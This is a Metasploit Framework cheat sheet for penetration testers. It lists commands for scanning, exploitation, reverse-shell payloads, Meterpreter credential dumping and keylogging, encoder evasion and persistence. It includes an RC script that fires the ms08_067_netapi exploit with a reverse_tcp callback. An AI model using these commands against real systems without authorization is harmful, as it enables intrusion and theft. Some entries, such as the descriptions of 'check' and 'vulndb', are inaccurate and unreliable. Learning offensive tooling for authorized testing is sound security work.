# **Metasploit Framework: Comprehensive Cheat Sheet**

**Metasploit is an advanced, open-source framework primarily used for developing, testing, and executing exploit code against remote targets. Originally developed by H.D. Moore, it’s now maintained by Rapid7 and is widely regarded as one of the most powerful and popular penetration testing tools in cybersecurity.**

---

## **Table of Contents**

1. [What is Metasploit?](#what-is-metasploit)
2. [Key Use Cases](#key-use-cases)
3. [Metasploit Framework Cheat Sheet](#metasploit-framework-cheat-sheet)
    - [Basic Commands](#1-basic-commands)
    - [Metasploit Architecture](#2-metasploit-architecture)
    - [Module Types Overview](#3-module-types-overview)
    - [Scanning and Enumeration](#4-scanning-and-enumeration)
    - [Exploiting Vulnerabilities](#5-exploiting-vulnerabilities)
    - [Payloads](#6-payloads)
    - [Meterpreter Post-Exploitation Commands](#7-meterpreter-post-exploitation-commands)
    - [Auxiliary Modules for Scanning and Enumeration](#8-auxiliary-modules-for-scanning-and-enumeration)
    - [Encoders and Evasion](#9-encoders-and-evasion)
    - [Post-Exploitation Modules](#10-post-exploitation-modules)
    - [Exploit Database and CVE Integration](#11-exploit-database-and-cve-integration)
    - [Database and Workspace Management](#12-database-and-workspace-management)
    - [Scripting and Automation](#13-scripting-and-automation)
    - [Maintaining Persistence](#14-maintaining-persistence)
    - [Useful External Tools](#15-useful-external-tools)

---

## **What is Metasploit?**

**Metasploit is an exploit development and execution platform for identifying, attacking, and defending against network vulnerabilities. It is highly modular, enabling the seamless integration of exploits, payloads, encoders, and auxiliary modules, which combine to deliver powerful attack and defense capabilities.**

---

## **Key Use Cases**

***Metasploit is commonly used for:***

- **Vulnerability Assessment:** Scanning for network, system, and application vulnerabilities.
- **Exploitation:** Executing and testing exploit payloads against known vulnerabilities.
- **Post-Exploitation:** Performing actions like privilege escalation, persistence, and data gathering after a successful exploit.
- **Red Team Operations:** Simulating real-world attack vectors to test defense mechanisms.
- **Security Research and Training:** Learning about and experimenting with new exploits in a controlled lab environment.

---

## **Metasploit Framework Cheat Sheet**

---

### **1. Basic Commands**

- **Starting Metasploit Console (msfconsole):**
  ```bash
  msfconsole
  ```
- **Search for Modules:**
  ```bash
  search <keyword>
  ```
- **Use a Module:**
  ```bash
  use <module_path>
  ```
- **Display Module Info:**
  ```bash
  info <module>
  ```
- **Display All Options for a Module:**
  ```bash
  show options
  ```
- **Setting Options for Modules:**
  ```bash
  set <option_name> <value>
  ```
- **Show Payloads for Exploit:**
  ```bash
  show payloads
  ```
- **Show All Auxiliary Modules:**
  ```bash
  show auxiliary
  ```
- **Run Module:**
  ```bash
  run
  ```
- **Execute Exploit:**
  ```bash
  exploit
  ```
- **Background Current Session:**
  ```bash
  background
  ```
- **Display Active Sessions:**
  ```bash
  sessions -l
  ```
- **Connect to Session:**
  ```bash
  sessions -i <session_id>
  ```

---

### **2. Metasploit Architecture**

- **Key Components:**
  - **Modules:** Reusable units like exploits, payloads, encoders, and nops.
  - **Exploits:** Code that takes advantage of vulnerabilities.
  - **Payloads:** Code executed on a target after exploiting.
  - **Encoders:** Hide the payload in encoded form to evade detection.
  - **Auxiliary:** Non-exploit functions like scanning and fuzzing.
  - **Post:** Actions after exploitation, such as privilege escalation.

---

### **3. Module Types Overview**

- **Exploit Modules:**
  ```bash
  use exploit/<platform>/<name>
  ```
- **Payload Modules:**
  ```bash
  set PAYLOAD <payload>
  ```
- **Auxiliary Modules:**
  ```bash
  use auxiliary/<module>
  ```
- **Post Exploitation Modules:**
  ```bash
  use post/<module>
  ```
- **Encoder Modules:**
  ```bash
  use encoder/<encoder>
  ```
- **NOP Modules:**
  ```bash
  use nop/<nop>
  ```

---

### **4. Scanning and Enumeration**

- **Port Scanning (TCP):**
  ```bash
  use auxiliary/scanner/portscan/tcp
  set RHOSTS <target>
  run
  ```
- **Service Version Scanning:**
  ```bash
  use auxiliary/scanner/portscan/version
  set RHOSTS <target>
  run
  ```
- **SMB Enumeration:**
  ```bash
  use auxiliary/scanner/smb/smb_version
  set RHOSTS <target>
  run
  ```
- **FTP Service Enumeration:**
  ```bash
  use auxiliary/scanner/ftp/ftp_version
  set RHOSTS <target>
  run
  ```

---

### **5. Exploiting Vulnerabilities**

- **Identify and Load Exploit:**
  ```bash
  search <vulnerability or CVE-ID>
  use exploit/<platform>/<vulnerability>
  ```
- **Set Required Options (like RHOST, LHOST):**
  ```bash
  set RHOST <target>
  set LHOST <your_ip>
  set PAYLOAD <payload>
  ```
- **Execute Exploit:**
  ```bash
  exploit
  ```

---

### **6. Payloads**

- **Types of Payloads:**
  - **Singles:** Self-contained; only one stage.
  - **Stagers:** Load larger payloads (stages).
  - **Stages:** Executed by stagers to maintain stealth.

- **Common Payloads:**
  - **Reverse Shells:**
    ```bash
    windows/meterpreter/reverse_tcp
    linux/x86/meterpreter/reverse_tcp
    ```
  - **Bind Shells:**
    ```bash
    windows/shell_bind_tcp
    linux/x86/shell_bind_tcp
    ```
  - **Meterpreter:** Advanced payload with extensive post-exploitation capabilities.
    ```bash
    windows/meterpreter/reverse_https
    linux/x64/meterpreter/reverse_tcp
    ```

---

### **7. Meterpreter Post-Exploitation Commands**

- **System Info:**
  ```bash
  sysinfo
  ```
- **List Processes:**
  ```bash
  ps
  ```
- **File Upload/Download:**
  ```bash
  upload <local_path> <remote_path>
  download <remote_path> <local_path>
  ```
- **Privilege Escalation:**
  ```bash
  getsystem
  ```
- **Password Dumping:**
  ```bash
  hashdump
  ```
- **Keylogging:**
  ```bash
  keyscan_start
  keyscan_stop
  keyscan_dump
  ```
- **Session Migration (to stay persistent):**
  ```bash
  migrate <pid>
  ```

---

### **8. Auxiliary Modules for Scanning and Enumeration**

- **Scanning:**
  - Portscan (TCP):
    ```bash
    use auxiliary/scanner/portscan/tcp
    ```
  - SMB Scan:
    ```bash
    use auxiliary/scanner/smb/smb_version
    ```
  - FTP Version Scan:
    ```bash
    use auxiliary/scanner/ftp/ftp_version
    ```
  - HTTP Banner Grabber:
    ```bash
    use auxiliary/scanner/http/http_version
    ```

---

### **9. Encoders and Evasion**

- **Encode Payload:**
  ```bash
  use encoder/x86/shikata_ga_nai
  ```
  - **Setting Encoder Options:**
    ```bash
    set ENCODER <encoder_type>
    ```
- **Check Payload Validity:**
  ```bash
  check
  ```

---

### **10. Post-Exploitation Modules**

- **Gather System Information:**
  ```bash
  use post/windows/gather/hashdump
  run
  ```
- **Gather Network Configuration:**
  ```bash
  use post/multi/gather/network_config
  run
  ```
- **Extract Password Hashes:**
  ```bash
  use post/windows/gather/hashdump
  run
  ```

---

### **11. Exploit Database and CVE Integration**

- **Search for CVEs and Load Exploits:**
  ```bash
  search cve:<CVE-ID>
  ```
- **NVD Data Integration for CVE Info:**
  ```bash
  vulndb <CVE-ID>
  ```

---

### **12. Database and Workspace Management**

- **Initialize Database:**


  ```bash
  db_init
  ```
- **List Workspaces:**
  ```bash
  workspace -l
  ```
- **Create New Workspace:**
  ```bash
  workspace -a <name>
  ```
- **Switch Workspace:**
  ```bash
  workspace <name>
  ```
- **Delete Workspace:**
  ```bash
  workspace -d <name>
  ```

---

### **13. Scripting and Automation**

- **Run Custom Scripts (.rc files):**
  ```bash
  msfconsole -r <script.rc>
  ```
- **Example RC Script:**
  ```plaintext
  use exploit/windows/smb/ms08_067_netapi
  set PAYLOAD windows/meterpreter/reverse_tcp
  set RHOST <target>
  set LHOST <your_ip>
  exploit
  ```

---

### **14. Maintaining Persistence**

- **Persistent Backdoor Payload:**
  ```bash
  windows/meterpreter/reverse_tcp
  ```
- **Execute a Script on Login:**
  ```bash
  use post/windows/manage/persistence
  set SESSION <session_id>
  ```

---

### **15. Useful External Tools**

- **Nmap Integration:**
  ```bash
  db_nmap -sV <target>
  ```
- **Armitage:** GUI front-end for Metasploit.
- **Nessus Integration:**
  ```bash
  db_import <nessus_scan_file>
  ```

---  
